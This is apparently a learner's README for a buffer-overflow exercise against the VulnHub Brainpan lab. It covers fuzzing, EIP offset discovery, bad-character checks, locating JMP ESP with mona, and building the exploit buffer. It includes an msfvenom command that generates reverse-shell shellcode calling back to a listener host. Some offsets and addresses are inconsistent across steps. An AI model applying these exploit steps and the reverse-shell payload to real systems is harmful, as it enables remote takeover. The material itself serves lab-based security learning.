# bufferOverflow

This is my first BufferOverflow exerise - VulnHub Brainpan

Tool: Immunity Debugger

### Step 1 - Find the EIP 
  using fuzzing to locate the buffer overflow point - the EIP address
  
  Create an array of buffers, from 1 to 5900, with increments of 100. Send the buffer to the 
  
  target until received system crash  and checked the size of buffers that made the system crash

  Program: 1-fuzzer_eip.py
  
### Step 2 Control the EIP address 
 
  2.1 by binary tree analysis

  2.2 using metasploit
  Generate a pattern of string and send to the system. check the EIP 
  
    locate the pattern_create
    
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 9999
    
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 9999 -q 39694438
    
  Program: 2-controlling-eip.py
    
   
### Step 3 Locating Space and prepare the shellCode

    Finding the ESP addess 
    buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
  
  Program: 2-controlling-eip.py

### Step 4 Check Bad Characters

    Send \x01...\xff to the system and check which char(s) have been truncated
    Program: 3-controlling-eip.py
  

### Step 5 Locate the JMP ESP
    
As the ESP address can be changed during each execution, we need to find a "JMP ESP" instrcution to go to the ESP location 
 
    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
  
    JMP ESP address => \xe4\xff
    
### Step 6 check any memory protections such as DEP adn ASLR
    
    Find the program or DLL that can be used for their "JMP ESP" instruction.
    
    Immunity Debugger Command: !mona modules
    
   
  Immunity Debugger Command: !mona find -s "\xe4\xff" -m <program name>
                         e.g. !mona find -s “\xff\xe4” -m "libspp.dll"
  

### Step 7 Check the offset (btw ESP and playload)     

After the ESP address, check is there any overlapping between ESP and the playload area. Offset may required. 
Secondly, add NoP before place the shell code to avoid the shell code corruption during the GetPC routine overwrite a few bytes on the stack.   

### Step 8 Generating ShellCode using Metasploit

    Metasploit Command: msfvenom -l payloads
  
    Metasploit Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443  EXITFUNC-thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
  
    -f format
    -e encode
    -b exclude character 
    EXITFUNC-thread exit the function after exploit which makes the program can still running for next exploit.
 
 ### Step 9 Sending the ShellCode 
 
    filler = "A" * 780
    eip = "\x83\x0c\x09\x10" <- this address is pointing the the JMP ESP instruction set
    offset = "C" * 4
    nops = "\x90" * 10 <- shell code corruption
    inputBuffer = filler + eip + offset + nops + shellcode
 
  Program: 4-expolit-lin.py
  
  Program: 4-expolit-win.py
 
  
